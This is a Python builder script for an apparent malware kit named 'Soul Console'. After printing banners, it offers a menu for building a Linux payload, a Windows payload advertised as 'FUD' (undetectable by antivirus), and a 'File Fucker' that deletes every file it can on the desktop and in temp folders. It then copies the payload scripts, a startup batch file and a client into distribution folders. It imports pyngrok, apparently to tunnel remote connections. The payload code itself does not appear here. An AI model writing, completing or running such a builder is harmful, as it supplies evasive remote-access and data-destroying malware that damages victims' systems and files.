import os
import socket
from os import name as os_name, system
from colorama import init, Fore as cc
import select
import threading
import time
import random
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET
from pyngrok import ngrok
import shutil
clear = lambda: system('cls') if os_name == 'nt' else system('clear')
baner1 = f'''{b}
              ___           ___     
             /  /\         /  /\    
            /  /:/_       /  /:/    
           /  /:/ /\     /  /:/     
          /  /:/ /::\   /  /:/  ___ 
         /__/:/ /:/\:\ /__/:/  /  /\\
         \  \:\/:/~/:/ \  \:\ /  /:/
          \  \::/ /:/   \  \:\  /:/ 
           \__\/ /:/     \  \:\/:/  
             /__/:/       \  \::/   
             \__\/         \__\/    
    {w}
'''
baner2 = f'''{g}
           _____             __   ______                       __   
          / ___/____  __  __/ /  / ____/___  ____  _________  / /__ 
          \__ \/ __ \/ / / / /  / /   / __ \/ __ \/ ___/ __ \/ / _ \\
         ___/ / /_/ / /_/ / /  / /___/ /_/ / / / (__  ) /_/ / /  __/
        /____/\____/\__,_/_/   \____/\____/_/ /_/____/\____/_/\___/ 
                   {w}                                         
'''
 
baner3 = f'''
{r}
          ██████  ▒█████   █    ██  ██▓        ▄████▄   ▒█████   ███▄    █   ██████  ▒█████   ██▓    ▓█████ 
        ▒██    ▒ ▒██▒  ██▒ ██  ▓██▒▓██▒       ▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █ ▒██    ▒ ▒██▒  ██▒▓██▒    ▓█   ▀ 
        ░ ▓██▄   ▒██░  ██▒▓██  ▒██░▒██░       ▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   ▒██░  ██▒▒██░    ▒███   
          ▒   ██▒▒██   ██░▓▓█  ░██░▒██░       ▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒▒██   ██░▒██░    ▒▓█  ▄ 
        ▒██████▒▒░ ████▓▒░▒▒█████▓ ░██████▒   ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░▒██████▒▒░ ████▓▒░░██████▒░▒████▒
        ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░   ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░▓  ░░░ ▒░ ░
        ░ ░▒  ░ ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░ ▒  ░     ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░ ▒  ░ ░ ░  ░
        ░  ░  ░  ░ ░ ░ ▒   ░░░ ░ ░   ░ ░      ░        ░ ░ ░ ▒     ░   ░ ░ ░  ░  ░  ░ ░ ░ ▒    ░ ░      ░   
              ░      ░ ░     ░         ░  ░   ░ ░          ░ ░           ░       ░      ░ ░      ░  ░   ░  ░
                                              ░                                                             {w}

'''
list = [f"{baner1}", f"{baner2}", f"{baner3}"]
clear()
print(random.choice(list))
opsys = input(f'''
----------------------------------------------------------------------------------------------
1, Linux               (Kali/Debian based)
2, Windows             (FUD)
3, Windows File Fucker (FUD WIP) Deletes all files possible in desktop and temp dir

Input Operating System > ''')
if opsys == "1":
    print(f"{g} [+] Files are in the /dist/linux folder!")
    print(f"{r} DO NOT USE FILES FROM /default !!!{w}")
    shutil.copy(r"default\linux.py", "dist\linux")
    shutil.copy(r"default\client.py", "dist\clients")

if opsys == "2":
    print(f"{g} [+] Files are in the /dist/windows folder!")
    print(f"{r} DO NOT USE FILES FROM /default !!!{w}")
    shutil.copy(r"default\windows.py", "dist\windows")
    shutil.copy(r"default\filefucker.py", "dist\windows")
    shutil.copy(r"default\startup.bat", "dist\windows")
    shutil.copy(r"default\client.py", "dist\clients")
    
if opsys == "3":
    print(f"{g} [+] Files are in the /dist/filefucker folder!")
    print(f"{r} DO NOT USE FILES FROM /default !!!{w}")
    shutil.copy(r"default\filefucker.py", "dist\\file fucker")